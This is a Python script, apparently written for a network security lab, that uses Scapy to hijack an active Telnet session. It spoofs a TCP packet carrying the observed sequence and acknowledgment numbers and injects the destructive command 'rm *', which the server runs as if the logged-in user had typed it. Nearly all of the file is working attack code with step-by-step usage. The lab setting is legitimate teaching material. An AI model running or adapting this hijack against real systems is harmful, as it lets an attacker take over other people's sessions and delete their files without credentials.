#!/usr/bin/env python3
"""
TCP Session Hijacking — TCP/IP Attack Lab
==========================================
Injects a malicious command into an active, authenticated Telnet
session by spoofing a packet with the correct sequence number.

Unlike a RST attack (which kills the session), hijacking injects
DATA that the server executes as if typed by the legitimate user —
without needing the user's password.

Attack prerequisites (obtained via Wireshark):
  - Source/Destination IP and ports of active Telnet session
  - Current sequence number (next byte the server expects)
  - Current acknowledgment number (last byte received from server)

Payload breakdown:
  \\r     — carriage return: clears any partial command in the buffer
  rm *   — shell command: deletes all files in current directory
  \\n     — newline: submits the command
  \\r     — second carriage return for clean terminal state

Why it works:
    TCP segments are authenticated only by (src_ip, src_port, seq, ack).
    All four are observable via passive Wireshark sniffing on a LAN.
    The server cannot distinguish our spoofed packet from legitimate data.

Usage:
    1. Use Wireshark to sniff the target Telnet session
    2. Extract the four fields listed below
    3. Update variables and run: sudo python3 tcpsessionhijack.py

WARNING: For educational use in isolated lab environments only.
"""

from scapy.all import IP, TCP, send, ls

# ── Values extracted from Wireshark ───────────────────────────────────
# Find the most recent ACK packet from the client (10.9.0.5 → 10.9.0.6)
# In Wireshark detail pane read:
#   Source Port, Sequence number, Acknowledgment number

CLIENT_IP   = "10.9.0.5"   # Legitimate client (spoof as this)
SERVER_IP   = "10.9.0.6"   # Target server (receives our packet)
CLIENT_PORT = 39676         # Client's source port (from Wireshark)
SERVER_PORT = 23            # Telnet port
SEQ_NUM     = 2537671292   # Next byte server expects FROM client
ACK_NUM     = 963565695    # Last byte client received FROM server
# ──────────────────────────────────────────────────────────────────────

# Payload: inject 'rm *' command
# \r clears any partial input in the Telnet line buffer
# rm * deletes all files in the current remote directory
# \n executes the command
PAYLOAD = '\r rm *\n\r'

print("[*] Crafting TCP Session Hijack packet...")
print(f"    Spoofing client: {CLIENT_IP}:{CLIENT_PORT}")
print(f"    Target server:   {SERVER_IP}:{SERVER_PORT}")
print(f"    SEQ={SEQ_NUM}  ACK={ACK_NUM}")
print(f"    Payload: {repr(PAYLOAD)}\n")

ip  = IP(src=CLIENT_IP, dst=SERVER_IP)
tcp = TCP(sport=CLIENT_PORT, dport=SERVER_PORT,
          flags="A",           # ACK — normal data transfer flag
          seq=SEQ_NUM,
          ack=ACK_NUM)
pkt = ip / tcp / PAYLOAD

print("Sending Hijacking Packet\n")
ls(pkt)

send(pkt, verbose=0)
print("\n[✔] Packet sent — check server for command execution.")
print("[!] Note: Legitimate session will freeze (sequence desync).")
